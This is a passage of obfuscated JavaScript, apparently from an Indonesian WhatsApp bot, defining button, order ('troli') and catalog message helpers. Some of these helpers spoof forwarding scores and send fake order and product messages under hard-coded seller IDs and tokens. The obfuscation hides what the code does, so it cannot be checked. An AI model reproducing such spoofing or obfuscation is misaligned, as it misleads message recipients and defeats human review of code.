_0x15af3d(_0x5e5e68-0x28f,_0x5e5e68-0x1ca,_0x578c2c,_0x479836-0x59);}_0x30e5c9[_0x1774b6(0x4de,0x4ea,0xf6,0x41f)]=_0xc09ea2,_0x30e5c9[_0x1774b6(0x42f,-0x39e,0x33e,0x8f)]=0x2,_0x30e5c9[_0x1e4bd4(0xd6a,0x8e4,0xbd4,0x5c6)]=''+ucapannya2,_0x30e5c9['body']=''+tampilTanggal,_0x30e5c9[_0x1774b6(0x722,0x7a1,0x29e,0x4d4)+'rl']='',_0x30e5c9['thumbnail']=pp_userz;const _0x3a4015={};_0x3a4015[_0x1e4bd4(0xdbc,0xb80,0xc81,0xe78)+_0x1774b6(0x995,0x902,0xa59,0x8b0)]=0x3b9aca00,_0x3a4015[_0x1e4bd4(0xcef,0x817,0x42a,0x395)+'d']=!![],_0x3a4015[_0x1774b6(-0x20d,0x75b,-0x203,0x2d6)+_0x1e4bd4(0x963,0x859,0x892,0x4a5)]=!![],_0x3a4015[_0x1774b6(-0x22f,0x178,-0x150,0x202)+'id']=[_0x4f668d,_0x5ec705,_0x3b4f89],_0x3a4015['externalAd'+_0x1774b6(0xb4,-0x1f,0x2d4,0x134)]=_0x30e5c9;const _0x1d4ad7={};_0x1d4ad7[_0x1e4bd4(0xce2,0xd4a,0x1226,0xf94)+'o']=_0x3a4015,_0x1d4ad7[_0x1e4bd4(0xd64,0xebd,0x11eb,0xcaa)]=fgif,_0x1d4ad7[_0x1e4bd4(0x868,0x8b9,0x423,0x3f1)+_0x1774b6(-0x187,0x14f,0x383,0x276)]=!![],alpha[_0x1774b6(0x772,0xa03,0x71c,0x781)+'e'](_0x16a8b7,_0x4a6bdd,MessageType['buttonsMes'+'sage'],_0x1d4ad7);},sendButLocation=async(_0x69f0dc,_0x2f466b,_0x4a6336,_0x576b35,_0x4b2edc=[],_0x39e0ab={})=>{const _0x522d7c={};_0x522d7c['WbTOC']=_0xd0bf05(0x9ad,0x65f,0x7d5,0x588)+_0xd0bf05(0xa00,0x7e1,0x7c5,0xe75);const _0x225a54=_0x522d7c;function _0x59c519(_0x7d293a,_0x1f5e55,_0x366300,_0xd0bec3){return _0x15af3d(_0x7d293a- -0x402,_0x1f5e55-0x19c,_0xd0bec3,_0xd0bec3-0xa2);}kma=_0x576b35;const _0x29516d=await alpha[_0x59c519(0x7f5,0xbda,0x5be,0x582)+_0x59c519(0x6f4,0x692,0x981,0x5dc)](_0x69f0dc,kma,MessageType[_0x59c519(0x281,0x268,0x6bd,-0x110)],{'thumbnail':kma});mhan=_0x29516d[_0xd0bf05(0x82e,0x818,0x80f,0x5cd)][_0x225a54[_0x59c519(0x331,0x6f2,0x4f9,0x46c)]]?_0x29516d[_0xd0bf05(0x82e,0x6d7,0xcd9,0x936)][_0xd0bf05(0x9ad,0xbdd,0x838,0xb0c)+'essage']:_0x29516d;const _0x49c65f={};_0x49c65f[_0x59c519(0x27f,0x5e0,0x68a,0x4f5)+_0xd0bf05(0x923,0x502,0x768,0x702)]=mhan[_0xd0bf05(0x82e,0x7dc,0xa86,0xaab)][_0xd0bf05(0x6e3,0x9e6,0x501,0x442)+_0x59c519(0x4bf,0x189,0x49e,0x1e1)],_0x49c65f[_0x59c519(0x548,0x484,0x48a,0x3c4)+'t']=_0x2f466b,_0x49c65f[_0xd0bf05(0xb67,0xa13,0xb19,0x85a)]=_0x4a6336,_0x49c65f['buttons']=_0x4b2edc,_0x49c65f['headerType']=0x6;function _0xd0bf05(_0x2deb05,_0x1e99d4,_0x1dbea0,_0x4e9c8e){return _0x15af3d(_0x2deb05-0x62,_0x1e99d4-0x188,_0x1dbea0,_0x4e9c8e-0xc8);}const _0xf1fa80=_0x49c65f;alpha['sendMessag'+'e'](_0x69f0dc,_0xf1fa80,MessageType['buttonsMes'+_0xd0bf05(0xb58,0xbbb,0x8bb,0x69a)],_0x39e0ab);},sendButVideo=async(_0x270633,_0x2b5b01,_0x5209e1,_0x177968,_0x3a6c85=[],_0x204556={})=>{const _0x1a4428={};_0x1a4428['DcCbe']=_0xdd1faa(0x4ad,0x54f,0x3df,0x542)+_0xdd1faa(0x441,0x4c1,0x2ac,0x595);const _0x5a374a=_0x1a4428;function _0x1e98f3(_0x3c199e,_0xbfdc13,_0x5224d1,_0x3fd9e3){return _0x134458(_0xbfdc13-0x3f6,_0xbfdc13-0x1f,_0x3fd9e3,_0x3fd9e3-0x52);}function _0xdd1faa(_0x525b6e,_0x1b7292,_0x504c5d,_0x44e08a){return _0x134458(_0x44e08a- -0x2b6,_0x1b7292-0x1e5,_0x1b7292,_0x44e08a-0x1ad);}kma=_0x177968;const _0x20ad07=await alpha[_0xdd1faa(0x5bb,0x6e0,0x562,0x7ee)+_0x1e98f3(0xaaf,0xd99,0xaca,0x11bf)](_0x270633,kma,MessageType[_0xdd1faa(0x1b6,-0x30f,-0x35b,0x16c)]);mhan=_0x20ad07[_0x1e98f3(0xa1b,0xa6f,0xd54,0x999)][_0x5a374a['DcCbe']]?_0x20ad07[_0x1e98f3(0xa17,0xa6f,0xe45,0xc23)][_0x1e98f3(0xadd,0xbee,0xa0b,0x948)+_0xdd1faa(0x839,0x59f,0x54c,0x595)]:_0x20ad07;const _0x9648c2={};_0x9648c2[_0xdd1faa(0x5ba,0x112,0x614,0x494)+'ge']=mhan['message'][_0x1e98f3(0x779,0xb40,0xd89,0xb3c)+'ge'],_0x9648c2[_0x1e98f3(0xe4e,0xbed,0xfd2,0xd00)+'t']=_0x2b5b01,_0x9648c2[_0xdd1faa(0x7eb,0xae8,0xaac,0x6fc)]=_0x5209e1,_0x9648c2[_0xdd1faa(-0x34c,-0x34,0x32c,0x6b)]=_0x3a6c85,_0x9648c2['headerType']=0x5;const _0x5c5128=_0x9648c2;alpha[_0x1e98f3(0x111d,0xd78,0xa95,0xe31)+'e'](_0x270633,_0x5c5128,MessageType['buttonsMes'+_0xdd1faa(0xbbf,0x669,0xa39,0x6ed)],_0x204556);},sendButImage=async(_0x356693,_0x256f74,_0x2c66d3,_0x57cc4e,_0x90dc1a=[],_0x356ea6={})=>{kma=_0x57cc4e;const _0xf53eff=await alpha[_0x28a7bb(0x9cc,0x6a3,0x88d,0xd7c)+_0x28a7bb(0x8cb,0xd91,0x9f0,0xd9a)](_0x356693,kma,MessageType[_0x77f7ca(-0x34b,-0x30b,-0x399,0x159)],{'thumbnail':Buffer[_0x77f7ca(-0x22c,0x60e,-0x6,0x259)](0x211d+-0x4*-0x38b+-0x2f49)});mhan=_0xf53eff[_0x28a7bb(0x5a1,0x6dd,0x24a,0x192)][_0x77f7ca(0x807,0x842,0x379,0x5d7)+'essage']?_0xf53eff['message'][_0x28a7bb(0x720,0xa30,0x934,0x8e1)+_0x28a7bb(0x773,0x7bb,0x94d,0x3a7)]:_0xf53eff;const _0x557f59={};_0x557f59[_0x77f7ca(0x584,0x946,0x432,0x5b1)+'ge']=mhan[_0x77f7ca(0x260,0x35b,0x758,0x458)]['imageMessa'+'ge'],_0x557f59[_0x77f7ca(0xf2,0x1ea,0x165,0x5d6)+'t']=_0x256f74,_0x557f59['footerText']=_0x2c66d3,_0x557f59[_0x77f7ca(0x23d,0xf5,0x299,0x100)]=_0x90dc1a;function _0x28a7bb(_0x1f6346,_0x4dfe21,_0x41a74f,_0x2b8408){return _0x15af3d(_0x1f6346- -0x22b,_0x4dfe21-0x1d4,_0x41a74f,_0x2b8408-0x1a7);}_0x557f59[_0x28a7bb(0x364,0x3ec,0x461,0x22)]=0x4;function _0x77f7ca(_0x2b1c3e,_0xc0aaef,_0x23a4f4,_0x517655){return _0x15af3d(_0x517655- -0x374,_0xc0aaef-0x122,_0x23a4f4,_0x517655-0xb);}const _0x23ea4b=_0x557f59;alpha['sendMessag'+'e'](_0x356693,_0x23ea4b,MessageType[_0x77f7ca(0x3be,0x41b,0x40,-0xd0)+_0x77f7ca(0xaad,0xb2a,0x435,0x782)],_0x356ea6);};function _0x134458(_0x1da7dd,_0x58d532,_0x5b7c9f,_0x3fa681){return _0x4ca6(_0x1da7dd- -0x17,_0x5b7c9f);}if(autoregister){if(autoregister===![])return;const _0x3f289d={};_0x3f289d[_0x15af3d(0x6ec,0xb61,0x4c4,0x390)+'t']=_0x15af3d(0x380,0x6d,0x252,0x4ec);const _0x219042={};_0x219042[_0x15af3d(0xc33,0x890,0xf7b,0xeed)]=_0x134458(0x724,0x3d3,0x5f4,0x6ce),_0x219042[_0x15af3d(0x5a7,0x222,0x9e8,0x5a2)]=_0x3f289d,_0x219042[_0x134458(0x8ff,0x6f0,0xada,0x4a1)]=_0x134458(0x867,0x7b0,0x942,0x51a);const _0x276b68={};_0x276b68[_0x134458(0x599,0x340,0xad,0x975)+'t']=_0x15af3d(0x83b,0x622,0x616,0x37c)+_0x134458(0x4f2,0x89,0x6b8,0x72a);const _0x2d9652={};_0x2d9652[_0x15af3d(0xc33,0x1048,0x10f3,0x96e)]=_0x134458(0x946,0xc62,0xceb,0xe18)+'ff',_0x2d9652[_0x134458(0x454,0xd7,0x2b1,0x923)]=_0x276b68,_0x2d9652[_0x15af3d(0xa52,0x7da,0xd37,0x561)]='RESPONSE';let gaklopo=[_0x219042,_0x2d9652];if(isCmd&&!mek['key'][_0x134458(0x185,0x42a,0x5f6,0x32c)]&&!isOwner&&!isCreator&&!isRegister)return sendButMessage(from,_0x134458(0x4ae,0x784,0x2df,-0x44)+sender[_0x15af3d(0x53f,0x2c8,0x394,0x114)]('@')[0x1a37+-0x1087*0x2+0x6d7]+(_0x134458(0x961,0xb8d,0xbb0,0x679)+'m\x20terdafta'+_0x134458(0x809,0x687,0xc88,0xa1e)+_0x15af3d(0x30a,0x52b,0x40f,0x378)+_0x134458(0x618,0x161,0x79d,0x994)+_0x15af3d(0x650,0xa9b,0x27f,0x751)+_0x15af3d(0x7a2,0xabe,0x7bb,0x96e)+_0x134458(0x36f,0x662,0x3d1,-0x109)+_0x15af3d(0x8d5,0x956,0x7ac,0x765)+_0x134458(0xacd,0xf49,0x643,0x73f)+_0x15af3d(0xc4a,0xe43,0xf29,0x10f6)+_0x15af3d(0x8d0,0xb17,0x7a2,0x9e2)+_0x15af3d(0xbd7,0x834,0xa73,0x730)+_0x15af3d(0x557,0x582,0x670,0x441)),botname+_0x134458(0x1a7,0x368,-0x2c,0x44f)+ownername,gaklopo,{'quoted':fgclink2,'contextInfo':{'mentionedJid':[sender]}});}const sendTroli=async _0x443f0b=>{const _0x16e9d6={};_0x16e9d6['jtBxx']=_0x574cde(0xb1d,0xe89,0xd81,0x65b)+_0x574cde(0x3e5,0x4b3,0xa2,0x5e3),_0x16e9d6[_0x336920(0xb46,0x5cf,0x738,0x9fd)]=_0x336920(0x178,0x1ca,0x656,0x97c),_0x16e9d6['bXiAq']='ZEEONE\x20OFC',_0x16e9d6[_0x574cde(0x199,0x64f,0x526,-0xac)]=_0x574cde(0x53a,0x42e,0x809,0x9ff)+_0x336920(0x354,0x28e,0x19f,-0x151)+_0x574cde(0xb1a,0x877,0xf3a,0x6b9)+_0x336920(0x4c6,0xc23,0x895,0x59d)+'0FGwkw==';const _0x2867a7=_0x16e9d6;let _0x21609a=fs[_0x336920(0x362,0x469,0x4b9,0xe1)+'nc'](_0x574cde(0x2aa,-0xd8,0x74b,0x2bb)+thumbnail);function _0x574cde(_0x3b45b3,_0x2431fe,_0x5553e3,_0x2b3b3f){return _0x134458(_0x3b45b3-0x15,_0x2431fe-0x1da,_0x2431fe,_0x2b3b3f-0xc2);}imeu=await alpha[_0x574cde(0xab9,0xe07,0x907,0x991)+_0x336920(0xdf8,0xc23,0x936,0x9aa)](_0x2867a7['jtBxx'],_0x21609a,image),imeg=imeu['message'][_0x336920(0xbd7,0x7c2,0x765,0xb8c)+'ge'];const _0x23da10={};_0x23da10[_0x336920(0x875,0x905,0x731,0xb63)+'Score']=0x3,_0x23da10[_0x336920(0x413,0x2af,0x3c8,0x4b)+'d']=!![];const _0x4f9950={};_0x4f9950['quoted']=fgif,_0x4f9950[_0x574cde(0x97d,0x7cb,0x7da,0xe57)+'o']={},res=await alpha[_0x574cde(0xab9,0x628,0xba7,0xbd9)+'sageFromCo'+_0x336920(0x51f,0x5d1,0x383,0x7b)](from,{'orderMessage':{'orderId':_0x336920(0xb98,0x761,0x982,0x861)+'00587','thumbnail':fs[_0x336920(0xab,0x34,0x4b9,0x64a)+'nc'](_0x336920(-0x2b,0x368,0x228,0xd)+thumbnail),'itemCount':0x7e5,'status':_0x336920(0x8ef,0x5e0,0x75c,0x918),'surface':_0x2867a7[_0x336920(0x800,0x840,0x738,0x76d)],'orderTitle':_0x2867a7[_0x574cde(0x5c3,0x606,0x339,0x207)],'message':_0x443f0b,'sellerJid':_0x574cde(0x78e,0xc08,0x43e,0x3fa)+'7326@s.wha'+_0x574cde(0x2c5,0x45b,0x6e9,0xea),'token':_0x2867a7[_0x574cde(0x199,0x5d5,0x151,0x37f)],'contextInfo':_0x23da10}},_0x4f9950);function _0x336920(_0xd86ddd,_0x3bc2b8,_0x5a90e5,_0x479425){return _0x134458(_0x5a90e5- -0x6d,_0x3bc2b8-0x132,_0x3bc2b8,_0x479425-0x9e);}alpha[_0x336920(0x4b,0x359,0x1d6,0x572)+_0x336920(0x947,0xb12,0x936,0xd00)](res);},sendTroli2=async _0x4b23b2=>{const _0x55e2e5={};_0x55e2e5[_0x21c4ab(0x274,0x42c,0x2a4,0x681)]=_0x21c4ab(0x7e6,0xb27,0x852,0xfc6)+_0x595bee(0x948,0x726,0x702,0x22c),_0x55e2e5['KGOwC']=_0x595bee(0xc65,0xa93,0xd21,0x1105)+_0x595bee(0x57b,0x522,0x5f4,0x8f7),_0x55e2e5['pnZMM']=_0x21c4ab(0x393,0x7e8,0x9b4,0x32d),_0x55e2e5[_0x595bee(0xbbe,0xa4a,0xa64,0xdd4)]=_0x595bee(0xc40,0x707,0x857,0x88c)+'4W5fYrjbea'+'kPiI3/Xxar'+_0x595bee(0xa0a,0x7f6,0xc34,0x759)+_0x595bee(0xdc6,0xd25,0xaf9,0xbec);function _0x595bee(_0x2819cd,_0x2fae78,_0x299982,_0x37b1da){return _0x134458(_0x299982-0x332,_0x2fae78-0x17a,_0x2fae78,_0x37b1da-0xb3);}_0x55e2e5['wytoD']=_0x595bee(0x2de,0xa3b,0x597,0x9ed),_0x55e2e5[_0x21c4ab(0xd34,0xb29,0x8b3,0x924)]=_0x595bee(0xaa3,0x924,0x613,0x256);const _0x1d2139=_0x55e2e5;let _0x31dc1d=fs[_0x21c4ab(0x7ba,0x545,0x799,0x29a)+'nc'](_0x21c4ab(0x26e,0x2b4,0x2e4,-0x1e1)+thumbnail);imeu=await alpha[_0x595bee(0xcef,0x1261,0xdd6,0xfe0)+_0x21c4ab(0x582,0x9c2,0x5a5,0x4f2)](_0x1d2139[_0x21c4ab(0x117,0x42c,0x729,0x15e)],_0x31dc1d,image),imeg=imeu[_0x21c4ab(0x29c,0x698,0x3a1,0x29e)][_0x21c4ab(0x4b0,0x7f1,0xae9,0x69c)+'ge'];function _0x21c4ab(_0x3e4b88,_0x12bc45,_0x28bcfa,_0xf4fcb9){return _0x15af3d(_0x12bc45- -0x134,_0x12bc45-0xd2,_0xf4fcb9,_0xf4fcb9-0x1a0);}const _0x11f395={};_0x11f395[_0x21c4ab(0xc07,0x7bd,0x81f,0x2f8)+_0x595bee(0x9a2,0xbdd,0xde3,0xf00)]=0x3,_0x11f395['isForwarde'+'d']=!![];const _0x24bf01={};_0x24bf01[_0x21c4ab(0xb45,0xafa,0xc4f,0xf3f)]=fgif,_0x24bf01['contextInf'+'o']={},res=await alpha[_0x21c4ab(0x723,0xac3,0xfb7,0x664)+_0x595bee(0x9bd,0x12d6,0xe27,0xc76)+_0x21c4ab(0x6c2,0x40f,-0xbd,0x65e)](from,{'orderMessage':{'orderId':_0x1d2139['KGOwC'],'thumbnail':fs[_0x21c4ab(0x232,0x545,0x6ac,0x4a3)+'nc']('./image/'+thumbnail),'itemCount':0x7e5,'status':_0x1d2139['pnZMM'],'surface':_0x595bee(0xa7f,0xa79,0x9f5,0xe8b),'orderTitle':'ZEEONE\x20OFC','message':_0x4b23b2,'sellerJid':_0x595bee(0x7cb,0xe09,0xaab,0xf1e)+'7326@s.wha'+_0x595bee(0x1c1,0x962,0x5e2,0x274),'token':_0x1d2139[_0x595bee(0x95b,0x9fa,0xa64,0xbba)],'totalAmount1000':_0x1d2139[_0x21c4ab(0x536,0x8b0,0x41e,0x4b9)],'totalCurrencyCode':_0x1d2139[_0x595bee(0xf69,0xa2b,0xe3c,0x12fc)],'contextInfo':_0x11f395}},_0x24bf01),alpha[_0x595bee(0x5b9,0x61b,0x575,0x234)+_0x21c4ab(0xde4,0x9c2,0x4fe,0x8bd)](res);},sendKatalog2=async _0x5cf80f=>{const _0x4c44e9={};_0x4c44e9[_0x599a75(0x211,0x1f4,0x4c8,0x615)]=_0x508ae8(0x5ff,-0x236,0x1d7,0x479)+_0x599a75(0xc9b,0x8c3,0x9bf,0x8c8)+_0x508ae8(0x34f,0x136,0xb8,0x4b4),_0x4c44e9[_0x599a75(0x552,0x34f,0x20a,0x5ea)]='6288743504'+'7326@s.wha'+'tsapp.net';const _0x45fc2a=_0x4c44e9;let _0xb32982=fs[_0x599a75(0x5ac,0x459,0xbbd,0x735)+'nc'](_0x508ae8(0x352,0x36a,0x6,-0x218)+thumbnail);function _0x599a75(_0x5a2774,_0x352c45,_0x5d46d1,_0x222294){return _0x15af3d(_0x222294-0xbc,_0x352c45-0x18a,_0x352c45,_0x222294-0x46);}imeu=await alpha['prepareMes'+'sage'](_0x599a75(0x11f7,0x876,0xd15,0xd17)+_0x508ae8(0x552,0x544,0x141,0x51b),_0xb32982,image,{'thumbnail':_0xb32982}),imeg=imeu[_0x508ae8(0x4a9,0x210,0x3ea,0x334)]['imageMessa'+'ge'];const _0x503702={};_0x503702[_0x508ae8(0x94a,0xf8,0x5e0,0x260)+'ge']=imeg,_0x503702[_0x508ae8(0xa7d,0x374,0x7a1,0x2e0)]=_0x508ae8(0x5da,0x580,0x760,0x4fe)+_0x508ae8(0x4d0,-0x317,0x33,-0x494),_0x503702[_0x508ae8(0x409,-0x7f,0x273,0x5a9)]='ALL\x20MENU\x20B'+'OT',_0x503702[_0x508ae8(0xa77,0xca6,0x7fe,0x786)+'n']=_0x5cf80f,_0x503702[_0x508ae8(-0xa8,0x74,-0x9f,-0xeb)+'de']=_0x599a75(0x7da,0xfcb,0x108c,0xc3e);function _0x508ae8(_0x37a039,_0x27111c,_0x4633dd,_0xc866f2){return _0x134458(_0x4633dd- -0x28f,_0x27111c-0x9a,_0x27111c,_0xc866f2-0xa0);}_0x503702[_0x599a75(0x36,0x217,-0x40,0x366)+'t1000']=_0x45fc2a['Fgblk'],_0x503702[_0x508ae8(0x2fd,0x286,0x5e0,0x797)+'geCount']=0x1;const _0x389d2={};_0x389d2[_0x508ae8(0x997,0x783,0x50f,0x4d)+'Score']=0x3e7,_0x389d2[_0x599a75(0x4d1,0x623,0x1ff,0x644)+'d']=!![];const _0x1ea89a={};_0x1ea89a[_0x599a75(0x1151,0xd58,0xd84,0xca4)]=_0x503702,_0x1ea89a[_0x508ae8(0x332,0x3a5,0x44c,0x505)+_0x508ae8(0xace,0x491,0x865,0xd3d)]=_0x45fc2a['KaqjN'],_0x1ea89a[_0x599a75(0x723,0xdc8,0x9af,0xb77)+'o']=_0x389d2;const _0x412ba8={};_0x412ba8[_0x508ae8(0x387,0xafc,0x678,0x633)+'sage']=_0x1ea89a;const _0x1387e4={};_0x1387e4[_0x508ae8(0x93f,0x3b0,0x84c,0x4a3)]=mek,res=await alpha[_0x508ae8(0x3b8,0x82e,0x815,0xb83)+_0x599a75(0x100a,0xb41,0x10b0,0xd04)+_0x599a75(0x5de,0x561,0x5c9,0x5ff)](from,_0x412ba8,_0x1387e4),alpha[_0x508ae8(0x495,0x2dd,-0x4c,-0x1ac)+_0x599a75(0xa8b,0x833,0xe77,0xbb2)](res);},sendKatalog3=async _0x312853=>{const _0x27e3ad={};_0x27e3ad[_0x3b5207(-0x272,0x225,-0x528,-0x1a1)]=_0x3b5207(0x7cb,0x334,0x67a,0x761)+_0x55ff47(0x5f2,0x3ab,0x11b,0x291),_0x27e3ad[_0x3b5207(0x3be,0x7f3,0x8d1,0x714)]='USD',_0x27e3ad[_0x55ff47(0xc37,0x927,0x8b0,0x53d)]=_0x55ff47(0x51,0x328,0x614,0x4f5);function _0x55ff47(_0xc2685d,_0x42d5d9,_0x1e315e,_0x2f5332){return _0x134458(_0x42d5d9- -0x25,_0x42d5d9-0x16e,_0x2f5332,_0x2f5332-0x75);}_0x27e3ad['pFrJj']='100000',_0x27e3ad['nENjC']=_0x3b5207(0x7e2,0x50d,0x550,0x3d2)+_0x55ff47(0x48f,0x3dd,0x110,-0x7d)+_0x3b5207(0x30a,0x9d,-0x539,-0xf7);const _0x367561=_0x27e3ad;let _0x2052e7=fs['readFileSy'+'nc'](_0x55ff47(0x6ea,0x270,0x21,0x56d)+thumbnail);imeu=await alpha[_0x3b5207(0x45e,0xaf0,0xb13,0x6fd)+_0x55ff47(0x9b7,0x97e,0xb5d,0x5a3)](_0x367561['ucXKx'],_0x2052e7,image,{'thumbnail':_0x2052e7}),imeg=imeu[_0x55ff47(0x801,0x654,0x751,0x7ce)][_0x3b5207(0x85d,-0x14,0x7c5,0x42b)+'ge'];const _0x9e0ad0={};_0x9e0ad0['productIma'+'ge']=imeg,_0x9e0ad0[_0x3b5207(0x622,0x99d,0x9b0,0x689)]='3595319159'+_0x3b5207(-0x3cc,0x10d,-0x70,-0xe5),_0x9e0ad0[_0x3b5207(0x17d,0x598,-0x24f,0x15b)]=_0x55ff47(0x6fe,0x47d,0x505,0x520)+'OT',_0x9e0ad0[_0x3b5207(0x65b,0x5a7,0x59a,0x6e6)+'n']=_0x312853,_0x9e0ad0[_0x3b5207(0x2f,-0x5c7,-0x185,-0x1b7)+'de']=_0x367561[_0x55ff47(0x5e7,0xa96,0x7fe,0xd1a)],_0x9e0ad0['priceAmoun'+_0x55ff47(0xe80,0xb0b,0xed6,0x68d)]=_0x367561['MyRmN'],_0x9e0ad0[_0x55ff47(0xccd,0x88d,0x61d,0x602)+_0x3b5207(0x31e,0x55b,0x81f,0x60c)]=_0x367561['pFrJj'],_0x9e0ad0[_0x55ff47(0x98d,0x84a,0x485,0xb12)+_0x3b5207(0x4f0,-0xe1,0xa6,0x34a)]=0x1;const _0x561d21={};_0x561d21['forwarding'+_0x3b5207(0x37f,0x506,0x39d,0x70a)]=0x3e7,_0x561d21[_0x3b5207(-0x222,0x4f3,-0x3d5,0x8e)+'d']=!![];const _0xf425f0={};_0xf425f0[_0x55ff47(0x582,0xa70,0x6e9,0xc8c)]=_0x9e0ad0,_0xf425f0[_0x55ff47(0xb29,0x6b6,0x8d8,0x3bb)+_0x55ff47(0x6d6,0xacf,0xe66,0xf12)]=_0x367561[_0x55ff47(0x4dd,0x586,0x44f,0x831)],_0xf425f0[_0x3b5207(0x1f8,0xa65,0x5da,0x5c1)+'o']=_0x561d21;const _0x3a4c93={};_0x3a4c93[_0x3b5207(0x5f6,0x946,0x38a,0x560)+_0x55ff47(0x667,0x97e,0xcc9,0x798)]=_0xf425f0;const _0x3add69={};_0x3add69['quoted']=mek;function _0x3b5207(_0x18c389,_0x44c45e,_0x5c2cfa,_0x302d60){return _0x15af3d(_0x302d60- -0x4fa,_0x44c45e-0x1ee,_0x18c389,_0x302d60-0x1c4);}res=await alpha[_0x3b5207(0x679,0x2e1,0x915,0x6fd)+_0x55ff47(0x994,0xad0,0x760,0xda5)+_0x55ff47(0x3ef,0x3cb,0x76b,0x5b6)](from,_0x3a4c93,_0x3add69),alpha[_0x55ff47(-0x6e,0x21e,0x459,0x198)+_0x3b5207(0x184,0xa3c,0x34a,0x5fc)](res);},sendKatalog=async(_0x1724f6,_0x4cc903,_0x53af83)=>{function _0x53f7ae(_0x4fbab,_0x5b79e0,_0x39e45f,_0x20bd21){return _0x15af3d(_0x5b79e0-0x127,_0x5b79e0-0x82,_0x4fbab,_0x20bd21-0xc8);}const _0x23e618={};_0x23e618[_0x5b00de(0x123,-0x533,0x3d0,-0x61)]='0@s.whatsa'+_0x53f7ae(0x486,0x64a,0x715,0x64f),_0x23e618[_0x53f7ae(0x1e5,0x642,0x7d3,0x67f)]=_0x5b00de(0x659,0x706,0xac1,0x740)+_0x53f7ae(0x47,0x53c,0x231,0x303),_0x23e618[_0x5b00de(0x2ba,0x6c,-0x16e,-0xf3)]=_0x5b00de(0xb88,0x963,0xac9,0x780),_0x23e618[_0x5b00de(0x8bc,0x82a,0x8f6,0x694)]=_0x53f7ae(0x553,0x641,0x1a7,0x399),_0x23e618[_0x53f7ae(0x8f9,0xd9c,0x8bd,0x11a0)]=_0x53f7ae(0x844,0x9f3,0x7ce,0xc78)+_0x5b00de(-0x2bc,0x468,0x5c0,0x153)+_0x53f7ae(0x83b,0x52a,0x37c,0x986);const _0x26cd6a=_0x23e618;let _0x5a885d=fs[_0x53f7ae(0x7ec,0x7a0,0x46e,0x7e3)+'nc'](_0x53f7ae(0x9d3,0x50f,0x6e2,0x5df)+thumbnail);imeu=await alpha[_0x5b00de(0x880,0x8b8,0xb3a,0x7f5)+_0x53f7ae(0xec5,0xc1d,0xbf9,0xafa)](_0x26cd6a['eJhFH'],_0x5a885d,image,{'thumbnail':_0x5a885d}),imeg=imeu[_0x5b00de(-0xef,0x601,0x5b,0x3ca)][_0x5b00de(0x491,0x962,0x9f9,0x523)+'ge'];const _0x2e9116={};_0x2e9116['productIma'+'ge']=imeg,_0x2e9116['productId']=_0x26cd6a[_0x53f7ae(0x879,0x642,0x39c,0x2dc)],_0x2e9116[_0x5b00de(0x11e,0x1df,-0x1e7,0x253)]=_0x1724f6,_0x2e9116[_0x53f7ae(0xe36,0xd07,0x9bb,0xf4b)+'n']=_0x53af83,_0x2e9116[_0x5b00de(0x11b,-0x3f3,-0x335,-0xbf)+'de']=_0x26cd6a[_0x5b00de(0x73,0x337,-0x40e,-0xf3)],_0x2e9116[_0x5b00de(0xc6,0x101,-0x178,-0x158)+'t1000']=_0x4cc903,_0x2e9116[_0x5b00de(0x3dd,0x9df,0x7f9,0x603)+'mount1000']=_0x26cd6a[_0x5b00de(0x24c,0x752,0x7b3,0x694)],_0x2e9116['productIma'+_0x53f7ae(0xd2a,0x96b,0xc38,0xb35)]=0x1;function _0x5b00de(_0x1c3988,_0x114a11,_0x57f28a,_0xb24475){return _0x15af3d(_0xb24475- -0x402,_0x114a11-0x155,_0x57f28a,_0xb24475-0x16c);}const _0x750f27={};_0x750f27['forwarding'+_0x53f7ae(0xcca,0xd2b,0xa70,0xf3b)]=0x3,_0x750f27[_0x5b00de(-0x2fd,-0x94,0x2a7,0x186)+'d']=!![];const _0x4d5b94={};_0x4d5b94[_0x53f7ae(0xd13,0xd0f,0x854,0xbc4)]=_0x2e9116,_0x4d5b94['businessOw'+'nerJid']=_0x26cd6a[_0x5b00de(0xae9,0x887,0xc46,0x873)],_0x4d5b94[_0x5b00de(0x886,0x57d,0x4dc,0x6b9)+'o']=_0x750f27;const _0x16b1af={};_0x16b1af[_0x5b00de(0x779,0x347,0x6af,0x658)+'sage']=_0x4d5b94;const _0x200a8f={};_0x200a8f[_0x5b00de(0xbce,0x8ae,0x87b,0x82c)]=fgif,_0x200a8f[_0x5b00de(0x840,0xacb,0x63d,0x6b9)+'o']={},res=await alpha[_0x53f7ae(0x11c4,0xd1e,0xf96,0xcec)+_0x5b00de(0x522,0xc7b,0x95c,0x846)+_0x53f7ae(0x38a,0x66a,0x306,0x32f)](from,_0x16b1af,_0x200a8f),alpha[_0x53f7ae(0x91e,0x4bd,0x49f,0x12f)+_0x5b00de(0xa84,0x567,0xba9,0x6f4)](res);},sendList=async _0x1341b2=>{const _0x3997df={};_0x3997df['mlLhz']=_0x257511(0x6ed,0x168,0xa6,0x481)+'E',_0x3997df['FkNjr']=_0x1164f1(0x1057,0xbd3,0xfe2,0xb21)+_0x1164f1(0xafb,0x678,0x5a8,0x524),_0x3997df[_0x1164f1(0x644,0x9c9,0xe47,0xaeb)]=_0x1164f1(0x5fd,0xa8f,0xf0d,0x9bb)+'ot',_0x3997df[_0x257511(0x3ab,0x99a,0x16b,0x577)]=_0x257511(0x330,0x753,0x451,0x29f)+_0x1164f1(0x7c5,0x950,0x640,0x673)+_0x257511(0x8a2,0x4be,0x624,0x8dd)+_0x257511(0xc22,0x7f2,0xe85,0x9e2)+'enu\x20comman'+'d_',_0x3997df[_0x1164f1(0xbf9,0x944,0xd00,0x5d1)]=_0x257511(0xf4e,0xb2c,0x6e3,0xb64)+'e-1',_0x3997df[_0x257511(0xbb7,0x95c,0xc07,0xa49)]=_0x1164f1(0x3f5,0x73e,0xc10,0x94e)+'nu',_0x3997df['xrzMA']=_0x257511(-0x23b,0x5c8,0x43e,0x29f)+'is\x20if\x20you\x20'+'want\x20to\x20us'+_0x257511(0x91b,0x9ff,0x97c,0x6d6)+_0x257511(0x7ef,0x42c,0x2bc,0x6ce)+_0x1164f1(0x109d,0xd4f,0xe40,0x102e),_0x3997df[_0x257511(0xafc,0xd31,0xc65,0x872)]=_0x257511(0x758,0x783,0x8d8,0xb64)+_0x257511(0x434,0x1e3,0x2a6,0x1f3),_0x3997df[_0x1164f1(0x7d1,0xcb8,0x10c7,0xb32)]=_0x1164f1(0xa93,0xb40,0xe70,0x87a),_0x3997df[_0x1164f1(0x2d3,0x61e,0x3c8,0x1ae)]='_choose\x20th'+_0x1164f1(0x95b,0x950,0x733,0x7df)+'want\x20to\x20us'+_0x257511(0x4fc,0x398,-0x90,0x2d3)+_0x1164f1(0xf09,0xd82,0xd